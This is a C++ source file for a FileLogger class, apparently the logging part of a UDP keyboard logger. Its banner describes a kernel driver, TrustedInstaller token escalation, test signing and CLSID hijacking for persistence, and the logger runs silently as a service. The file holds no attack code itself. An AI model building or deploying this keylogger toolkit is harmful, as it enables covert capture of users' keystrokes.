#include "FileLogger.h"
#include <iostream>
#include <iomanip>
#include <sstream>

// Constructor: Initialize logger with base filename and set up initial log file
FileLogger::FileLogger(const std::string& filename) 
    : baseFilename_(filename), sessionStartTime_(std::chrono::system_clock::now()) {
    
    // Get current date for initial log file
    auto now = std::chrono::system_clock::now();
    auto currentTime = std::chrono::system_clock::to_time_t(now);
    std::tm localTime{};
    localtime_s(&localTime, &currentTime);
    
    // Store the date of the last log entry for daily rotation
    lastLogDate_ = std::chrono::year{static_cast<int>(localTime.tm_year) + 1900} /
                   std::chrono::month{static_cast<unsigned int>(localTime.tm_mon) + 1} /
                   std::chrono::day{static_cast<unsigned int>(localTime.tm_mday)};
    
    // Open log file in append mode
    logFile_.open(generateFilename(), std::ios::app);
    if (!logFile_.is_open()) {
        throw std::runtime_error("Cannot open log file: " + generateFilename());
    }
    
    // Silent mode - no console output for service
}

// Destructor: Ensure log file is properly closed
FileLogger::~FileLogger() {
    if (logFile_.is_open()) {
        logFile_.close();
    }
}

// Write session header with listener configuration and client information
void FileLogger::writeHeader(const std::string& listenerAddress, int listenerPort, const std::string& clientAddress) {
    std::lock_guard<std::mutex> lock(fileMutex_);
    
    if (!logFile_.is_open()) {
        return;
    }
    
	// Write banner
	logFile_ << "################################################################################\n";
	logFile_ << "###                                                                          ###\n";
	logFile_ << "###              UDP KEYBOARD LOGGER - KERNEL/USER-MODE BRIDGE               ###\n";
	logFile_ << "###                                                                          ###\n";
	logFile_ << "###  System: kvckbd.sys driver + ExplorerFrame.dll + UDP service (31415)     ###\n";
	logFile_ << "###  Deployment: TrustedInstaller token escalation, BCD test signing,        ###\n";
	logFile_ << "###              DriverStore integration, and CLSID hijacking for            ###\n";
	logFile_ << "###              persistence.                                                ###\n";
	logFile_ << "###                                                                          ###\n";
	logFile_ << "###  Author: Marek Wesolowski | marek@wesolowski.eu.org | +48 607 440 283    ###\n";
	logFile_ << "###  Project: https://kvc.pl                                                 ###\n";
	logFile_ << "###                                                                          ###\n";
	logFile_ << "################################################################################\n\n";
    
    // Write session information
    logFile_ << "===============================================================================\n";
    logFile_ << "Session started: " << getCurrentDateTimeString() << "\n";
    logFile_ << "Listener: " << listenerAddress << ":" << listenerPort << "\n";
    
    // Include client address if provided (logged on first message)
    if (!clientAddress.empty()) {
        logFile_ << "Client: " << clientAddress << "\n";
    }
    
    logFile_ << "===============================================================================\n\n";
    
    logFile_.flush();
}

// Write session footer with total duration statistics
void FileLogger::writeFooter() {
    std::lock_guard<std::mutex> lock(fileMutex_);
    
    if (!logFile_.is_open()) {
        return;
    }
    
    // Calculate session duration
    auto sessionEnd = std::chrono::system_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::seconds>(sessionEnd - sessionStartTime_);
    
    auto totalSeconds = duration.count();
    auto hours = totalSeconds / 3600;
    auto minutes = (totalSeconds % 3600) / 60;
    auto seconds = totalSeconds % 60;
    
    // Write footer with formatted duration
    logFile_ << "\n";
    logFile_ << "===============================================================================\n";
    logFile_ << "Session ended: " << getCurrentDateTimeString() << "\n";
    logFile_ << "Total duration: ";
    
    if (hours > 0) {
        logFile_ << hours << " hour" << (hours > 1 ? "s " : " ");
    }
    if (minutes > 0 || hours > 0) {
        logFile_ << minutes << " minute" << (minutes != 1 ? "s " : " ");
    }
    logFile_ << seconds << " second" << (seconds != 1 ? "s" : "") << "\n";
    
    logFile_ << "===============================================================================\n";
    
    logFile_.flush();
}

// Log a message with timestamp
void FileLogger::log(const std::string& message) {
    std::lock_guard<std::mutex> lock(fileMutex_);
    
    try {
        // Check if we need to rotate to a new file (daily rotation)
        rotateFileIfNeeded();
        
        if (logFile_.is_open()) {
            logFile_ << "[" << getCurrentTimeString() << "] " << message << std::endl;
            logFile_.flush(); // Force immediate write to disk
            
            // Force OS to write buffers to physical disk
            std::string filename = generateFilename();
            FILE* file = nullptr;
            fopen_s(&file, filename.c_str(), "a");
            if (file) {
                fflush(file);
                fclose(file);
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Logging error: " << e.what() << std::endl;
    } catch (...) {
    }
}

// Rotate log file if the date has changed (daily rotation)
void FileLogger::rotateFileIfNeeded() {
    // Check if we've entered a new day
    if (isNewDay()) {
        try {
            // Write footer to current log file
            writeFooter();
            
            // Close current log file
            if (logFile_.is_open()) {
                logFile_.close();
            }
            
            // Open new log file for the new day
            logFile_.open(generateFilename(), std::ios::app);
            if (!logFile_.is_open()) {
                throw std::runtime_error("Cannot open new log file: " + generateFilename());
            }
            
            // Update stored date to current date
            auto now = std::chrono::system_clock::now();
            auto currentTime = std::chrono::system_clock::to_time_t(now);
            std::tm localTime{};
            localtime_s(&localTime, &currentTime);
            
            lastLogDate_ = std::chrono::year{static_cast<int>(localTime.tm_year) + 1900} /
                           std::chrono::month{static_cast<unsigned int>(localTime.tm_mon) + 1} /
                           std::chrono::day{static_cast<unsigned int>(localTime.tm_mday)};
            
            // Reset session start time for new file
            sessionStartTime_ = std::chrono::system_clock::now();
            
            // Silent mode - no console output for service
            
        } catch (const std::exception& e) {
            std::cerr << "File rotation error: " << e.what() << std::endl;
        }
    }
}

// Check if the current date differs from the last logged date
bool FileLogger::isNewDay() const {
    auto now = std::chrono::system_clock::now();
    auto currentTime = std::chrono::system_clock::to_time_t(now);
    std::tm localTime{};
    localtime_s(&localTime, &currentTime);
    
    auto currentDate = std::chrono::year{static_cast<int>(localTime.tm_year) + 1900} /
                       std::chrono::month{static_cast<unsigned int>(localTime.tm_mon) + 1} /
                       std::chrono::day{static_cast<unsigned int>(localTime.tm_mday)};
    
    return currentDate != lastLogDate_;
}

// Get current date as string (YYYY-MM-DD format)
std::string FileLogger::getCurrentDateString() const {
    auto now = std::chrono::system_clock::now();
    auto currentTime = std::chrono::system_clock::to_time_t(now);
    std::tm localTime{};
    localtime_s(&localTime, &currentTime);
    
    std::ostringstream oss;
    oss << std::put_time(&localTime, "%Y-%m-%d");
    return oss.str();
}

// Get current time as string (HH:MM:SS format)
std::string FileLogger::getCurrentTimeString() const {
    auto now = std::chrono::system_clock::now();
    auto currentTime = std::chrono::system_clock::to_time_t(now);
    std::tm localTime{};
    localtime_s(&localTime, &currentTime);
    
    std::ostringstream oss;
    oss << std::put_time(&localTime, "%H:%M:%S");
    return oss.str();
}

// Get current date and time as string (YYYY-MM-DD HH:MM:SS format)
std::string FileLogger::getCurrentDateTimeString() const {
    auto now = std::chrono::system_clock::now();
    auto currentTime = std::chrono::system_clock::to_time_t(now);
    std::tm localTime{};
    localtime_s(&localTime, &currentTime);
    
    std::ostringstream oss;
    oss << std::put_time(&localTime, "%Y-%m-%d %H:%M:%S");
    return oss.str();
}

// Generate filename with date suffix (e.g., keyboard_log_2025-10-08.txt)
	std::string FileLogger::generateFilename() const {
    std::filesystem::path path(baseFilename_);
    std::string stem = path.stem().string();
    std::string extension = path.extension().string();
    
    // ZACHOWAJ ŚCIEŻKĘ - to jest kluczowa zmiana!
    std::filesystem::path resultPath = path.parent_path() / (stem + "_" + getCurrentDateString() + extension);
    return resultPath.string();
}